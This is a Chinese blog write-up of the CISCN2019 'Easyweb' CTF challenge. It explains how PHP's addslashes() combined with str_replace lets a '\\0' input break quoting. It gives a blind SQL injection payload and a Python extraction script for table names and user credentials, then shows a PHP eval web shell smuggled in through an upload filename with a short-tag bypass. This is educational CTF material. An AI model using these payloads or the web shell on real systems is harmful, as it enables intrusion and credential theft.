---

title: 日常练习35——二次注入前瞻关于addslashes()函数

date: 2021-05-18 22:03:31

tags: 练习

categories: test85

---

这道题算是给二次注入开头了，因为它涉及了二次注入中一个重要的函数——addslashes()函数。  

# [CISCN2019 总决赛 Day2 Web1]Easyweb

这是前年国赛总决赛的一题，重点考察了addslashes()函数的利用。  

打开题目，看到一个登陆界面：

[![](https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png)](https://pic.imgdb.cn/item/60a86a5a6ae4f77d358e18f8.png)  

测试后发现图片有两张不同的回显，大致就可以判断这道题和盲注有关了，接着我们可以在robots.txt里找到这道题目的提示（比赛中对于这些细节还是要检查的）   

[![](https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png)](https://pic.imgdb.cn/item/60a9d26835c5199ba783de65.png)  

可以看到提示我们有备份文件，我们可以下载得到image.php.bak文件，里面包含源码：  

	<﻿?php
	include "config.php";
	
	$id=isset($_GET["id"])?$_GET["id"]:"1";
	$path=isset($_GET["path"])?$_GET["path"]:"";
	
	$id=addslashes($id);
	$path=addslashes($path);
	
	$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
	$path=str_replace(array("\\0","%00","\\'","'"),"",$path);
	
	$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
	$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
	
	$path="./" . $row["path"];
	header("Content-Type: image/jpeg");
	readfile($path);  

源码审计一下，首先以get方式传参id和path，然后这两个参数要经过addslashes()函数，随后对这两个经过变化的参数进行正则匹配，替换掉一些字符。最终将这两个经过变换的变量拼接到sql语句中进行查询。  

这里最重要的就是这个addslashes()函数，我们需要知道他是干什么的：  

	addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。
	预定义字符是：
	单引号（’）
	双引号（"）
	反斜杠（\）
	NULL    

也就是说如果我们传入的字符串中有上面的预定义字符，那么经过这个函数后就会在这些字符前面加上转义字符"\"。   

比如下面的代码  

	<?php
    $id = "\\0";
    echo $id.'<br>';
	$id = addslashes($id);
	echo $id.'<br>';
	$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
	echo $id;
	?>  

返回的字符分别是   

	\0
	\\0
	\  

也就是说\0在经过addslashes()函数后被加上\变为\\0，然后经过正则匹配\0被替换成空，最终也就变成了\。  

但是如果这个转义字符被拼接到sql语句中会发生什么呢？  

	select * from images where id='\' or path='{$path}'  

可以看到转义字符后面的单引号会被转义，原来的闭合单引号往后顺延，那么最终id的值为：\' or path=，也就是说原来关于path的查询不存在了，现在只剩下关于id的值的查询。  

但是我们仍然可以上传变量path来进行拼接，又因为这道题的查询回显页面不同，没有回显结果，所以我们可以使用盲注来查询。  

payload语句如下：  

	?id=\\0&path=or 1=if(length(database())>1,1,-1)#  

这样最终的sql查询语句实际上是：  

select * from images where id='**\' or path=** or 1=if(length(database())>1,1,-1)'#  
（加粗的字符是id的值）  

很明显的盲注，测试后发现确实会有不同的回显。  

接下来就是上脚本来得到用户名和密码了:  


	import requests


	url = 'http://ac4c87f5-3044-4096-b55a-0c647ae76c50.node3.buuoj.cn/image.php?id=\\0&path=or 1='
	flag = ''
	table_name = ''
	
	for i in range(1, 50):
    for c in range(127, 0, -1):
        payload = 'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))=%d,1,-1)%%23' % (i, c)
        #payload = 'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23' % (i, c)
        #payload = 'if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23' % (i, c)
        #payload = 'if(ascii(substr((select group_concat(password) from users),%d,1))=%d,1,-1)%%23' % (i, c)
        r = requests.get(url+payload)

        if "JFIF" in r.text:
            table_name += chr(c)
            print(table_name)
            break

得到密码和用户名：  

[![](https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png)](https://pic.imgdb.cn/item/60a9df3135c5199ba7efdfdb.png)

登录，发现是一个上传文件的页面：  

直接抓包上传一句话木马试试。  

[![](https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png)](https://pic.imgdb.cn/item/60a9dfb335c5199ba7f53744.png)  

告诉我们将文件名记录在日志中，那么我们尝试通过文件名写入一句话木马。  

修改Content-Disposition中参数filename的值为<?php @eval($_POST['cmd']) ?>  

[![](https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png)](https://pic.imgdb.cn/item/60a9e02735c5199ba7f9dfdf.png)  

又说不让上传php文件，应该是我们的文件名中有php字符，那么我们使用短标签绕过  

我们这样构造：  

	<?= @eval($_POST['cmd']); ?>  

成功上传，接下来就是蚁剑链接了：  

[![](https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png)](https://pic.imgdb.cn/item/60a9e11d35c5199ba7032905.png)  

根目录得到flag。  

# 小结  

这道题重点就是addslashes()函数的操作，如何构造字符来利用addslashes()函数和下面的正则匹配来成功执行sql盲注，之后的二次注入也将和他有关，此外就是关于上传文件的文件名一句话木马和短标签绕过这两个小知识点。

